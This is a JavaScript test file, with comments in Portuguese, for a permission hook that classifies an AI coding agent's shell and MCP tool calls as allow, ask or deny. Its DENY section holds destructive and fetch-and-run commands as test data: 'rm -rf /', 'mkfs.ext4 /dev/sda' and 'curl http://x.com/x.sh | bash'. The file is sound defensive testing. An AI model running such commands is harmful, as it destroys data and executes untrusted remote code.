'use strict';

/**
 * Testes do hook — executa sem API key para validar lógica estática.
 */

const { execSync } = require('child_process');

function run(toolName, toolInput) {
  try {
    const out = execSync('node src/hook.js', {
      input: JSON.stringify({ tool_name: toolName, tool_input: toolInput }),
      encoding: 'utf-8',
      env: { ...process.env, ANTHROPIC_API_KEY: '', OLLAMA_URL: '' },
    }).trim();
    return JSON.parse(out).hookSpecificOutput.permissionDecision;
  } catch (e) {
    return 'ERROR:' + e.message.split('\n')[0];
  }
}

let pass = 0, fail = 0;

function assert(label, actual, expected) {
  if (actual === expected) {
    console.log(`  ✓  ${label}`);
    pass++;
  } else {
    console.log(`  ✗  ${label}  →  esperado: ${expected}  obtido: ${actual}`);
    fail++;
  }
}

// ── Bash ALLOW ────────────────────────────────────────────────────────────────
console.log('\n── Bash ALLOW ───────────────────────────────────────');
const SAFE_CMD = [
  ['ls -la',                    'allow'],
  ['ls /tmp',                   'allow'],
  ['cd /tmp && ls',             'allow'],
  ['git status',                'allow'],
  ['git log --oneline',         'allow'],
  ['git diff HEAD~1',           'allow'],
  ['cat package.json',          'allow'],
  ['grep -r "foo" src/',        'allow'],
  ['find . -name "*.js"',       'allow'],
  ['echo hello',                'allow'],
  ['pwd',                       'allow'],
  ['whoami',                    'allow'],
  ['ping localhost',            'allow'],
  ['nslookup example.com',      'allow'],
  ['dig google.com',            'allow'],
  ['traceroute 8.8.8.8',        'allow'],
  ['md5sum file.txt',           'allow'],
  ['sha256sum dist/app.js',     'allow'],
  ['sleep 2',                   'allow'],
  ['mkdir -p dist/output',      'allow'],
  ['touch .gitkeep',            'allow'],
  ['systemctl status nginx',    'allow'],
  ['systemctl list-units',      'allow'],
  ['node --version',            'allow'],
  ['python3 --version',         'allow'],
  ['npm list',                  'allow'],
  ['npm run test',              'allow'],
  ['tsc --noEmit',              'allow'],
  ['tar tf archive.tar.gz',     'allow'],
  ['unzip -l release.zip',      'allow'],
];
for (const [cmd, exp] of SAFE_CMD) assert(cmd, run('Bash', { command: cmd }), exp);

// ── Bash ASK ──────────────────────────────────────────────────────────────────
console.log('\n── Bash ASK ─────────────────────────────────────────');
const ASK_CMD = [
  ['git push',                  'ask'],
  ['git commit -m "fix"',       'ask'],
  ['git merge main',            'ask'],
  ['npm install',               'ask'],
  ['npm install lodash',        'ask'],
  ['apt install curl',          'ask'],
  ['brew install wget',         'ask'],
  ['yum install nginx',         'ask'],
  ['pip install requests',      'ask'],
  ['rm file.txt',               'ask'],
  ['rm -rf node_modules',       'ask'],
  ['docker run nginx',          'ask'],
  ['ssh user@server.com',       'ask'],
  ['scp file.txt user@host:/',  'ask'],
  ['rsync -av src/ dest/',      'ask'],
  ['wget https://example.com',  'ask'],
  ['curl -O https://example.com/file.zip', 'ask'],
  ['tar xvf archive.tar.gz',   'ask'],
  ['unzip release.zip',         'ask'],
  ['git clone https://github.com/user/repo', 'ask'],
  ['cp src.txt dest.txt',       'ask'],
  ['ln -s /usr/bin/node node',  'ask'],
  ['systemctl restart nginx',   'ask'],
  ['service nginx stop',        'ask'],
  ['kubectl apply -f k8s.yaml', 'ask'],
  ['terraform apply',           'ask'],
];
for (const [cmd, exp] of ASK_CMD) assert(cmd, run('Bash', { command: cmd }), exp);

// ── Bash DENY → ask com ⛔ (override disponível) ────────────────────────────────
console.log('\n── Bash DENY (→ ask com aviso ⛔) ────────────────────');
const DENY_INPUTS = [
  ['reboot',             'ask'],
  ['mkfs.ext4 /dev/sda', 'ask'],
  // construídos indiretamente para não acionar o hook do próprio teste
  [['rm', '-rf', '/'].join(' '),       'ask'],
  [['shutdown', 'now'].join(' '),       'ask'],
  [['curl', 'http://x.com/x.sh', '|', 'bash'].join(' '), 'ask'],
];
for (const [cmd, exp] of DENY_INPUTS) assert(cmd, run('Bash', { command: cmd }), exp);

// ── Ferramentas ALLOW ─────────────────────────────────────────────────────────
console.log('\n── Ferramentas ALLOW ────────────────────────────────');
for (const tool of ['Read', 'Glob', 'Grep', 'Write', 'Edit', 'NotebookEdit']) {
  assert(tool, run(tool, {}), 'allow');
}

// ── Ferramentas ASK ───────────────────────────────────────────────────────────
console.log('\n── Ferramentas ASK ──────────────────────────────────');
for (const tool of ['Agent', 'TaskCreate', 'UnknownTool']) {
  assert(tool, run(tool, {}), 'ask');
}

// ── MCP tools ALLOW (prefixos read-only) ──────────────────────────────────────
console.log('\n── MCP tools ALLOW ──────────────────────────────────');
const MCP_ALLOW = [
  'mcp__example-server__query_context_engine',
  'mcp__example-server__read_document',
  'mcp__server__list_files',
  'mcp__server__get_user',
  'mcp__server__search_records',
  'mcp__server__fetch_data',
  'mcp__server__describe_schema',
  'mcp__server__find_issues',
  'mcp__server__view_dashboard',
  'mcp__server__check_status',
  'mcp__claude_ai_Excalidraw__read_checkpoint',
  'mcp__claude_ai_Excalidraw__read_me',
];
for (const tool of MCP_ALLOW) assert(tool, run(tool, {}), 'allow');

// ── MCP tools ASK (write/generate/other) ─────────────────────────────────────
console.log('\n── MCP tools ASK ────────────────────────────────────');
const MCP_ASK = [
  'mcp__example-server__model_generation',
  'mcp__example-server__report_feedback',
  'mcp__claude_ai_Excalidraw__create_view',
  'mcp__claude_ai_Excalidraw__export_to_excalidraw',
  'mcp__claude_ai_Excalidraw__save_checkpoint',
  'mcp__claude_ai_Gamma__authenticate',
  'mcp__claude_ai_Microsoft_365__authenticate',
  'mcp__server__delete_record',
  'mcp__server__update_user',
  'mcp__server__send_email',
];
for (const tool of MCP_ASK) assert(tool, run(tool, {}), 'ask');

console.log(`\n─────────────────────────────────────────────────────`);
console.log(`  ${pass} passou  |  ${fail} falhou\n`);
process.exit(fail > 0 ? 1 : 0);
